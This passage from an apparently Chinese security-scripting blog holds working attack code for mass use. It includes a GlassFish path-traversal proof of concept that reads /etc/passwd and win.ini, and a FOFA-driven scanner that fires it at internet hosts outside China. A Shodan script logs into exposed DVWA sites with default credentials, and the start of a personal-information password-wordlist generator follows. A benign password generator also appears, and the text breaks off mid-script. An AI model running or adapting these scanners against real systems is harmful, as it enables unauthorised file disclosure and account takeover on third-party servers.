function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/etc/passwd<br><br>windowsPOC:http://localhost:4848/theme/META-INF/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/windows/win.ini<br><br></code></pre></td></tr></table></figure><img src="/img/image-20230915100934734.png" alt="image-20230915100934734" style="zoom:67%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#在sdk里执行</span><br><span class="hljs-keyword">import</span> fofa<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment">#定义漏洞列表</span><br>vul_ips = []<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_vuln</span>(<span class="hljs-params">ips</span>):<br>    linux_POC = <span class="hljs-string">&#x27;/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&#x27;</span><br>    windows_POC = <span class="hljs-string">&#x27;/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&#x27;</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ips:<br>        ip = i.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)    <span class="hljs-comment">#换行替换为空</span><br>        windows_url = <span class="hljs-string">&quot;http://&quot;</span>+ip+<span class="hljs-string">&quot;:4848&quot;</span>+windows_POC<br>        linux_url = <span class="hljs-string">&quot;http://&quot;</span>+ip+<span class="hljs-string">&quot;:4848&quot;</span>+linux_POC<br><br>        <span class="hljs-keyword">try</span>:<br>            vuln_code_linux = requests.get(linux_url).status_code<br>            vuln_code_windows = requests.get(windows_url).status_code<br>            <span class="hljs-keyword">if</span> vuln_code_linux == <span class="hljs-number">200</span> <span class="hljs-keyword">or</span> vuln_code_windows == <span class="hljs-number">200</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] ip:&quot;</span>+ip+<span class="hljs-string">&quot;存在glassfish任意文件读取漏洞&quot;</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    email, key = (<span class="hljs-string">&#x27;xxx&#x27;</span>, <span class="hljs-string">&#x27;xxxx&#x27;</span>)  <span class="hljs-comment"># 输入email和key</span><br>    client = fofa.Client(email, key)                <span class="hljs-comment"># 将email和key传入fofa.Client类进行初始化和验证，并得到一个fofa client对象</span><br>    query_str = <span class="hljs-string">&#x27;&quot;glassfish&quot; &amp;&amp; port=&quot;4848&quot; &amp;&amp; country!=&quot;CN&quot;&#x27;</span><br>    <br><br>    <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>):                       <span class="hljs-comment"># 从第1页查到第x页</span><br>        <span class="hljs-comment"># fpoint = client.get_userinfo()[&quot;fofa_point&quot;]      # 查询F点剩余数量</span><br>        <span class="hljs-comment"># if fpoint &lt; 100:</span><br>        <span class="hljs-comment">#     break                                   # 当F点小于100时，不再获取数据</span><br>        <span class="hljs-keyword">try</span>:<br>            data = client.search(query_str, size=<span class="hljs-number">10</span>, page=page, fields=<span class="hljs-string">&quot;ip&quot;</span>)  <span class="hljs-comment"># 查询第page页数据的ip</span><br>            <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> data[<span class="hljs-string">&quot;results&quot;</span>]:<br>                <span class="hljs-comment">#print (ip)             # 打印出每条数据的ip</span><br>                vul_ips.append(ip)<br>                <span class="hljs-comment">#print(vul_ips)</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;账号信息错误&quot;</span>)<br><br>check_vuln(vul_ips)<br></code></pre></td></tr></table></figure><h2 id="shodan实战"><a href="#shodan实战" class="headerlink" title="shodan实战"></a>shodan实战</h2><h3 id="shodan-python脚本文档"><a href="#shodan-python脚本文档" class="headerlink" title="shodan  python脚本文档"></a>shodan  python脚本文档</h3><p><a href="https://shodan.readthedocs.io/en/latest/">https://shodan.readthedocs.io/en/latest/</a></p><p><a href="https://github.com/achillean/shodan-python">https://github.com/achillean/shodan-python</a></p><p>以dvwa靶场为例</p><p>默认用户名密码：admin:password</p><p>思路：</p><p>1.使用shodan搜索dvwa  title:dvwa</p><p>2.使用默认用户密码+网页源码中的usertoken进行登录</p><img src="/img/image-20230915110636012.png" alt="image-20230915110636012" style="zoom: 67%;" /><p>post 登录语句:username&#x3D;admin&amp;password&#x3D;password&amp;Login&#x3D;Login&amp;user_token&#x3D;{token}</p><p>登录成功–302</p><p><img src="/img/image-20230915154636049.png" alt="image-20230915154636049"></p><p>Shodan.search()方法的返回值：</p><p><img src="/img/image-20230915183258357.png" alt="image-20230915183258357"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> shodan<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment">#shodankey</span><br>SHODAN_API_KEY = <span class="hljs-string">&quot;xxxx&quot;</span><br>api = shodan.Shodan(SHODAN_API_KEY)<br><br><br><span class="hljs-comment">#shodan搜索   返回第几页的搜索结果</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">request_shodan_api</span>(<span class="hljs-params">query,page=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-comment"># Wrap the request in a try/ except block to catch errors</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># Search Shodan</span><br>            instances = api.search(query,page=page)<br><br>            <span class="hljs-comment"># Show the results</span><br>            <span class="hljs-comment"># print(&#x27;Results found: &#123;&#125;&#x27;.format(results[&#x27;total&#x27;]))</span><br>            <span class="hljs-comment"># for result in results[&#x27;matches&#x27;]:</span><br>            <span class="hljs-comment">#         print(&#x27;IP: &#123;&#125;&#x27;.format(result[&#x27;ip_str&#x27;]))</span><br>            <span class="hljs-comment">#         #print(result[&#x27;data&#x27;])</span><br>            <span class="hljs-comment">#         #print(&#x27;&#x27;)</span><br>            <span class="hljs-keyword">return</span> instances    <span class="hljs-comment">#返回搜索结果</span><br><br>        <span class="hljs-keyword">except</span> shodan.APIError <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Error: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(e))<br>            time.sleep(<span class="hljs-number">5</span>)<br><br><span class="hljs-comment">#向目标网站发送请求  登录</span><br><span class="hljs-comment">#result为Shodan.search()方法的返回值中的matches字段的数据</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login_ip</span>(<span class="hljs-params">results</span>):<br>    <span class="hljs-comment">#判断协议是http还是https</span><br>    proto = (<span class="hljs-string">&#x27;ssl&#x27;</span> <span class="hljs-keyword">in</span> results) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;https&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;http&#x27;</span><br>    <span class="hljs-comment">#发起请求</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#print(f&quot;&#123;proto&#125;://&#123;results[&#x27;ip_str&#x27;]&#125;:&#123;results[&#x27;port&#x27;]&#125;/login.php&quot;)</span><br>        res = requests.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;proto&#125;</span>://<span class="hljs-subst">&#123;results[<span class="hljs-string">&#x27;ip_str&#x27;</span>]&#125;</span>:<span class="hljs-subst">&#123;results[<span class="hljs-string">&#x27;port&#x27;</span>]&#125;</span>/login.php&quot;</span>,verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">except</span> requests.exceptions.ConnectionError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> res.status_code != <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;目标不存在dvwa&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-comment">#获取token  发送post请求登录</span><br>    <span class="hljs-comment">#token = re.search(r&quot;user_token&#x27; value=&#x27;([0-9a-z]+)&#x27;&quot;,res.text).group(1)</span><br>    token1 = re.search(<span class="hljs-string">r&quot;user_token&#x27; value=&#x27;([0-9a-z]+)&#x27;&quot;</span>,res.text)<br>    <span class="hljs-keyword">if</span> token1:<br>        token=token1.group(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        token=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-comment"># try:</span><br>    <span class="hljs-comment">#     if token1:</span><br>    <span class="hljs-comment">#         token=token1.group(1)</span><br>    <span class="hljs-comment"># except:</span><br>    <span class="hljs-comment">#     print(&quot;匹配内容为空&quot;)</span><br>    res = requests.post(<br>        <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;proto&#125;</span>://<span class="hljs-subst">&#123;results[<span class="hljs-string">&#x27;ip_str&#x27;</span>]&#125;</span>:<span class="hljs-subst">&#123;results[<span class="hljs-string">&#x27;port&#x27;</span>]&#125;</span>/login.php&quot;</span>,<br>        <span class="hljs-string">f&quot;username=admin&amp;password=password&amp;Login=Login&amp;user_token=<span class="hljs-subst">&#123;token&#125;</span>&quot;</span>,<br>        allow_redirects=<span class="hljs-literal">False</span>,<br>        verify=<span class="hljs-literal">False</span>,<br>        headers=&#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;<br>        )<br>    <span class="hljs-comment">#登录成功会跳转到index.php</span><br>    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">302</span> <span class="hljs-keyword">and</span> res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>] == <span class="hljs-string">&#x27;index.php&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment">#page为Shodan.search()方法的返回值 查询结果的详情 </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_page</span>(<span class="hljs-params">page</span>):<br>    result = []<br>    <span class="hljs-keyword">for</span> instance <span class="hljs-keyword">in</span> page[<span class="hljs-string">&#x27;matches&#x27;</span>]:<br>        <span class="hljs-keyword">if</span> login_ip(instance):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+]存在默认口令：<span class="hljs-subst">&#123;instance[<span class="hljs-string">&#x27;ip_str&#x27;</span>]&#125;</span>:<span class="hljs-subst">&#123;instance[<span class="hljs-string">&#x27;port&#x27;</span>]&#125;</span>&quot;</span>)<br>            result.append(instance)<br>    <span class="hljs-keyword">return</span> result           <span class="hljs-comment">#返回存在默认用户名密码的ip列表</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">query_shodan</span>(<span class="hljs-params">query</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] 开始查询第一页&quot;</span>)<br>    first_page = request_shodan_api(query)  <span class="hljs-comment">#返回第一页查询结果</span><br>    total = first_page[<span class="hljs-string">&#x27;total&#x27;</span>]             <span class="hljs-comment">#数据总数</span><br>    already_processed = <span class="hljs-built_in">len</span>(first_page[<span class="hljs-string">&#x27;matches&#x27;</span>])  <br>    result = process_page(first_page)<br>    page = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> already_processed &lt; total:<br>        <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;正在查询第<span class="hljs-subst">&#123;page&#125;</span>页&quot;</span>)<br>        page = request_shodan_api(query,page=page)<br>        already_processed += <span class="hljs-built_in">len</span>(page[<span class="hljs-string">&#x27;matches&#x27;</span>])<br>        result += process_page(page)<br>        page += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> result<br><br>res = query_shodan(<span class="hljs-string">&#x27;title:dvwa&#x27;</span>)<br><span class="hljs-built_in">print</span>(res)<br><br></code></pre></td></tr></table></figure><h2 id="密码生成器"><a href="#密码生成器" class="headerlink" title="密码生成器"></a>密码生成器</h2><p>随机密码生成，例子：<a href="https://suijimimashengcheng.bmcx.com/">https://suijimimashengcheng.bmcx.com/</a></p><img src="/img/image-20230917153828063.png" alt="image-20230917153828063" style="zoom:67%;" /><h3 id="argparse模块"><a href="#argparse模块" class="headerlink" title="argparse模块"></a>argparse模块</h3><p><a href="https://zhuanlan.zhihu.com/p/539331146">python系列：argparse详解 - 知乎 (zhihu.com)</a></p><h3 id="string包含的属性"><a href="#string包含的属性" class="headerlink" title="string包含的属性"></a>string包含的属性</h3><img src="/img/image-20230917162312310.png" alt="image-20230917162312310" style="zoom: 50%;" /><img src="/img/image-20230917163807602.png" alt="image-20230917163807602" style="zoom:67%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">from</span> argparse <span class="hljs-keyword">import</span> ArgumentParser<br><span class="hljs-comment">#ArgumentParser解析命令行参数，并生成有用的帮助文档</span><br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> secrets      <span class="hljs-comment">#生成强随机数 </span><br><br><span class="hljs-comment">#存储生成的随机密码</span><br>passwords = []<br><br><span class="hljs-comment">#完全随机</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">createRandomPWD</span>(<span class="hljs-params">args</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.amount):<br>        <span class="hljs-comment">#secrets.choice功能与random.choice(seq)相同，从指定的非空序列中随机选择一个元素并返回</span><br>        passwords.append(<span class="hljs-string">&quot;&quot;</span>.join(<br>                [secrets.choice(string.digits+string.ascii_letters+string.punctuation)\<br>                <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.total_length)]))<br><br><span class="hljs-comment">#指定参数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">createArgumentPWD</span>(<span class="hljs-params">args</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.amount):<br>        password = []<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.numbers):<br>            password.append(secrets.choice(string.digits))<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.uppercase):<br>            password.append(secrets.choice(string.ascii_uppercase))<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.lowercase):<br>            password.append(secrets.choice(string.ascii_lowercase))<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(args.special_chars):<br>            password.append(secrets.choice(string.punctuation))<br>        <span class="hljs-comment">#random.shuffle用于将一个列表中的元素打乱顺序</span><br>        random.shuffle(password)<br>        password = <span class="hljs-string">&#x27;&#x27;</span>.join(password)<br>        passwords.append(password)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setParser</span>():<br>    parser = ArgumentParser(<br>        prog = <span class="hljs-string">&quot;密码生成器&quot;</span>,<br>        description = <span class="hljs-string">&quot;r1&#x27;s 密码生成器&quot;</span><br>    )<br><br>    <span class="hljs-comment">#定义命令行参数</span><br>    parser.add_argument(<span class="hljs-string">&quot;-l&quot;</span>,<span class="hljs-string">&quot;--lowercase&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;密码中包含小写字母的位数&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-u&quot;</span>,<span class="hljs-string">&quot;--uppercase&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;密码中包含大写字母的位数&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-n&quot;</span>,<span class="hljs-string">&quot;--numbers&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;密码中包含数字的位数&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-s&quot;</span>,<span class="hljs-string">&quot;--special_chars&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;密码中包含特殊字符的位数&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-t&quot;</span>,<span class="hljs-string">&quot;--total-length&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;密码的总长度&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br>    <span class="hljs-comment">#parser.add_argument(&quot;-nu&quot;,&quot;--number&quot;,default=0,help=&quot;生成密码的数量&quot;,type=int)</span><br>    parser.add_argument(<span class="hljs-string">&quot;-a&quot;</span>,<span class="hljs-string">&quot;--amount&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;生成密码的数量&quot;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-o&quot;</span>,<span class="hljs-string">&quot;--output_file&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;输出到文本文件&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> parser.parse_args()<br><br><span class="hljs-comment"># print(string.digits)</span><br><span class="hljs-comment"># print(string.ascii_lowercase)</span><br><span class="hljs-comment"># print(string.ascii_uppercase)</span><br><span class="hljs-comment"># print(string.punctuation)</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment">#获取参数</span><br>    args = setParser()<br>    <span class="hljs-keyword">if</span> args.total_length:<br>        <span class="hljs-comment">#指定了密码长度--完全随机</span><br>        createRandomPWD(args)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment">#未指定密码长度，自定义密码构成（数字、大小写字母、特殊字符的个数）</span><br>        createArgumentPWD(args)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>.join(passwords))<br>    <span class="hljs-comment">#写入文本</span><br>    <span class="hljs-keyword">if</span> args.output_file:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(args.output_file,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(<span class="hljs-string">&#x27;\n&#x27;</span>.join(passwords))<br></code></pre></td></tr></table></figure><p>待优化 </p><h2 id="社工字典生成器"><a href="#社工字典生成器" class="headerlink" title="社工字典生成器"></a>社工字典生成器</h2><p>收集个人、厂商等信息之后  社工字典就是根据这些信息组合生成密码</p><p>例如：姓名+生日    姓名+手机   身份证+昵称   等等</p><h3 id="迭代器与生成器"><a href="#迭代器与生成器" class="headerlink" title="迭代器与生成器"></a>迭代器与生成器</h3><p><a href="https://www.runoob.com/python3/python3-iterator-generator.html">Python3 迭代器与生成器 | 菜鸟教程 (runoob.com)</a></p><p><img src="/img/image-20230917175539938.png" alt="image-20230917175539938"></p><h3 id="itertools模块"><a href="#itertools模块" class="headerlink" title="itertools模块"></a>itertools模块</h3><p><a href="https://docs.python.org/zh-cn/3/library/itertools.html">itertools — 为高效循环而创建迭代器的函数 — Python 3.11.5 文档</a></p><p><img src="/img/image-20230917195100206.png" alt="image-20230917195100206"></p><p><img src="/img/image-20230917195113600.png" alt="image-20230917195113600"></p><p>实现原理（可扩充  例如位数可自行设置）：</p><p>1.信息长度大于等于8位的直接写入  </p><p>2.没到8位的拼接数字到8位  </p><p>3.两两组合做笛卡尔积  </p><p>4.前中后拼接特殊字符做笛卡尔积</p><p>个人信息示例：</p><p><img src="/img/image-20230922171702544.png" alt="image-20230922171702544"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-comment">#存放生成的密码</span><br>dictionaryFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;password.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br><br><span 